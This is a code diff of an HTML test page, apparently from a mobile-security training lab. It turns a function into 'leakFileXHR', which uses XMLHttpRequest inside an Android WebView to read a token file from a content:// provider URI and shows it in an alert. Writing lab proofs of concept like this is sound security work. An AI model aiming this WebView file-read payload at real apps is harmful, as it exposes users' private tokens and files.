@@ -3,20 +3,27 @@
 <head>
     <title>Test XMLHttpRequest with content://</title>
     <script type="text/javascript">
-        function loadContentFile() {
-            var xhttp = new XMLHttpRequest();
-            xhttp.open("GET", "content://io.hextree.attacksurface.provider/token.txt", true); // Content URI
-            xhttp.onreadystatechange = function() {
-                if (this.readyState == 4 && this.status == 200) {
-                    alert("File content: " + this.responseText);  // Show file content
+        function leakFileXHR(url) {
+            const xhr = new XMLHttpRequest();
+            xhr.open('GET', url, true);
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    if (xhr.status === 200) {
+                        alert("File Content:\n" + xhr.responseText);
+                    } else {
+                        alert("Failed to load file: " + xhr.status);
+                    }
                 }
             };
-            xhttp.send();
+            xhr.onerror = function() {
+                alert("Error occurred while loading the file.");
+            };
+            xhr.send();
         }
     </script>
 </head>
 <body>
     <h1>Test XMLHttpRequest with content://</h1>
-    <button onclick="loadContentFile()">Load File</button>
+    <button onclick="leakFileXHR('content://io.hextree.attacksurface.provider/token.txt')">Load File</button>
 </body>
 </html>
